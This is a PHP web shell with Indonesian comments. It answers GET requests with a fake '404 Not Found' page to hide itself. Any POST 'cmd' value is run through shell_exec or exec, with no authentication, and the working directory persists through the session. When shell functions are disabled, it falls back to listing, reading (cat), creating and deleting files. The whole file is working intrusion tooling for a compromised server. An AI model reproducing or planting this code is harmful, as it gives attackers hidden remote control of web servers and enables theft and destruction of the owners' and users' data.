<?php
// Cek jika bukan request POST, kembalikan 404
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 404 Not Found');
    echo '<h1>404 Not Found</h1>';
    echo 'The page you are looking for could not be found.';
    exit;
}

session_start(); // Mulai sesi untuk menyimpan direktori saat ini

// Jika tidak ada cmd, kembalikan direktori saat ini
if (!isset($_POST['cmd'])) {
    if (!isset($_SESSION['current_dir'])) {
        $_SESSION['current_dir'] = getcwd();
    }
    echo $_SESSION['current_dir'];
    exit;
}

$cmd = $_POST['cmd'];

// Jika belum ada direktori di sesi, set ke direktori awal
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

// Ubah ke direktori yang tersimpan di sesi
if (!chdir($_SESSION['current_dir'])) {
    echo "Gagal mengakses direktori sesi: " . $_SESSION['current_dir'];
    exit;
}

// Debug: Tampilkan direktori saat ini di awal output
$current_dir = getcwd();
$output_prefix = "Current dir: $current_dir\n";

// Cek jika direktori readable
if (!is_readable($current_dir)) {
    echo $output_prefix . "Direktori tidak readable! Cek permission.";
    exit;
}

if ($cmd === 'cd') {
    if (isset($_POST['path'])) {
        $path = $_POST['path'];
        // Coba ubah direktori
        if (chdir($path)) {
            $_SESSION['current_dir'] = getcwd(); // Simpan direktori baru ke sesi
            echo getcwd();
        } else {
            echo "Gagal pindah ke direktori '$path'! Mungkin path salah atau no permission.";
        }
    } else {
        echo "Path tidak diberikan!";
    }
} else {
    // Coba shell_exec sebagai opsi utama
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
        if ($output === null) {
            echo $output_prefix . "Perintah gagal atau tidak ada output!";
        } else {
            echo $output_prefix . $output;
        }
    } 
    // Jika shell_exec dinonaktifkan, coba exec
    elseif (function_exists('exec')) {
        $output = [];
        $return_var = 0;
        exec($cmd, $output, $return_var);
        if ($return_var === 0 && !empty($output)) {
            echo $output_prefix . implode("\n", $output);
        } else {
            echo $output_prefix . "Perintah gagal atau tidak ada output!";
        }
    } 
    // Jika keduanya mati, fallback ke fungsi PHP bawaan
    else {
        $cmd_parts = explode(' ', $cmd);
        $command = $cmd_parts[0];
        $arg = isset($cmd_parts[1]) ? $cmd_parts[1] : '';

        $fallback_output = '';
        switch ($command) {
            case 'ls':
            case 'dir':
                $dir = scandir($current_dir); // Pakai direktori saat ini
                if ($dir === false) {
                    $fallback_output = "Gagal membaca direktori! Cek permission.";
                } else {
                    $fallback_output = implode("\n", array_diff($dir, ['.', '..']));
                }
                break;
            case 'mkdir':
                if ($arg && mkdir($arg)) {
                    $fallback_output = "Direktori '$arg' berhasil dibuat!";
                } else {
                    $fallback_output = "Gagal membuat direktori atau argumen tidak diberikan! Cek permission.";
                }
                break;
            case 'rmdir':
                if ($arg && rmdir($arg)) {
                    $fallback_output = "Direktori '$arg' berhasil dihapus!";
                } else {
                    $fallback_output = "Gagal menghapus direktori atau argumen tidak diberikan! Cek permission.";
                }
                break;
            case 'touch':
                if ($arg && touch($arg)) {
                    $fallback_output = "File '$arg' berhasil dibuat!";
                } else {
                    $fallback_output = "Gagal membuat file atau argumen tidak diberikan! Cek permission.";
                }
                break;
            case 'cat':
                if ($arg && file_exists($arg)) {
                    $fallback_output = file_get_contents($arg);
                } else {
                    $fallback_output = "File tidak ditemukan atau argumen tidak diberikan!";
                }
                break;
            case 'rm':
                if ($arg && file_exists($arg) && unlink($arg)) {
                    $fallback_output = "File '$arg' berhasil dihapus!";
                } else {
                    $fallback_output = "Gagal menghapus file atau argumen tidak diberikan! Cek permission.";
                }
                break;
            default:
                $fallback_output = "Fungsi shell dinonaktifkan dan perintah tidak didukung!";
                break;
        }
        echo $output_prefix . $fallback_output;
    }
}
?>